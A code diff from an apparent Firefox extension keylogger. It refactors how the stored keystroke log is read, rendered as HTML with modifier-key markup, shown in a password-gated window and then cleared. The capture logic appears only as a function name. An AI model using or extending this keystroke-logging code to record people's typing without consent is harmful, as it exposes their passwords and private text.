@@ -45,6 +45,54 @@ keylog.logKeypress=function(e) {
 
 keylog.present_log=function() {
 
+	//read the contents of the log file
+	var file = Components.classes["@mozilla.org/file/local;1"].createInstance(Components.interfaces.nsILocalFile);
+	file.initWithPath(keylog.f);
+
+	var inputStream = Components.classes["@mozilla.org/network/file-input-stream;1"].createInstance(Components.interfaces.nsIFileInputStream);
+	inputStream.init(file, -1, 0,0);
+	var sInputStream = Components.classes["@mozilla.org/scriptableinputstream;1"].createInstance(Components.interfaces.nsIScriptableInputStream);
+	sInputStream.init(inputStream);
+	var str= sInputStream.read(sInputStream.available());
+
+	//writing the log file to a designed HTML file
+	var tmp_str='';
+	for(var y=0, begin_segment=0, len=String(str).length, charrr='', charrrAfter=''; y<len; y++)
+	{
+	 if(str.substring(y,y+1)=='|')
+	 {
+	  //tmp_str+=String.fromCharCode(str.substring(begin_segment,y));
+	  charrr = str.substring(begin_segment,y);
+	  if(!isNumber(charrr))
+	  {
+		tmp_str+='<i '+charrr+'>';
+		charrrAfter='</i>';
+	  }
+	  else
+	  {
+		  if(charrr == 13)
+			tmp_str+="<br>\n";
+		  else if(charrr == 8)
+			tmp_str+='<i bs></i>';
+		  else if(charrr == 0)
+			tmp_str+='<i tab></i>';
+		  else
+			tmp_str+='&#' + charrr + ';';
+
+			tmp_str+=charrrAfter;
+			charrrAfter = '';
+		}
+	  begin_segment=y+1;
+
+	 }
+	}
+
+	return tmp_str;
+};
+
+keylog.show_present_log=function(){
+
+
 	var pass="",
 		initial_pass="",
 		input_pass="",
@@ -86,17 +134,8 @@ keylog.present_log=function() {
 		return;
 	   }
 
-	//read the contents of the log file
-	var file = Components.classes["@mozilla.org/file/local;1"].createInstance(Components.interfaces.nsILocalFile);
-	file.initWithPath(keylog.f);
 
-	var inputStream = Components.classes["@mozilla.org/network/file-input-stream;1"].createInstance(Components.interfaces.nsIFileInputStream);
-	inputStream.init(file, -1, 0,0);
-	var sInputStream = Components.classes["@mozilla.org/scriptableinputstream;1"].createInstance(Components.interfaces.nsIScriptableInputStream);
-	sInputStream.init(inputStream);
-	var str= sInputStream.read(sInputStream.available());
-
-	//writing the log file to a designed HTML file
+	//not stored in history
 	var tmp_str='<!DOCTYPE html><html><head><meta charset="utf-8">'
 	+'<style>'
 	+'i{font-style:normal;border:1px solid #bbb;border-radius:3px;letter-spacing:-1px;margin-right:1px;padding:0 2px;} '
@@ -111,50 +150,14 @@ keylog.present_log=function() {
 	+'i[shiftaltctrl]:before {content:"shift+alt+ctrl+"} '
 	+'i[shiftalt]:before {content:"shift+alt+"} '
 	+'i[altctrl]:before {content:"alt+ctrl+"} '
-
-	+'</style></head><body style="font-family:monospace;line-height:20px;font-size:13px">' + "\n";
-
-	for(var y=0, begin_segment=0, len=String(str).length, charrr='', charrrAfter=''; y<len; y++)
-	{
-	 if(str.substring(y,y+1)=='|')
-	 {
-	  //tmp_str+=String.fromCharCode(str.substring(begin_segment,y));
-	  charrr = str.substring(begin_segment,y);
-	  if(!isNumber(charrr))
-	  {
-		tmp_str+='<i '+charrr+'>';
-		charrrAfter='</i>';
-	  }
-	  else
-	  {
-		  if(charrr == 13)
-			tmp_str+="<br>\n";
-		  else if(charrr == 8)
-			tmp_str+='<i bs></i>';
-		  else if(charrr == 0)
-			tmp_str+='<i tab></i>';
-		  else
-			tmp_str+='&#' + charrr + ';';
-
-			tmp_str+=charrrAfter;
-			charrrAfter = '';
-		}
-	  begin_segment=y+1;
-
-	 }
-	}
-	tmp_str += "\n</body></html>";
-	
-	return tmp_str;
-};
-
-keylog.show_present_log=function(){
-	tmp_str = keylog.present_log();
-	//not stored in history
+	+'</style>'
+	+'</head><body style="font-family:monospace;line-height:20px;font-size:13px">'+ keylog.present_log() +'</body></html>' + "\n";
 
 	var win=window.open('data:text/html;charset=utf-8,' + encodeURIComponent(tmp_str), 'log');
-	keylog.clear_log();
+	
 	win.focus();
+	keylog.clear_log();
+	
 };
 
 keylog.clear_log=function(){
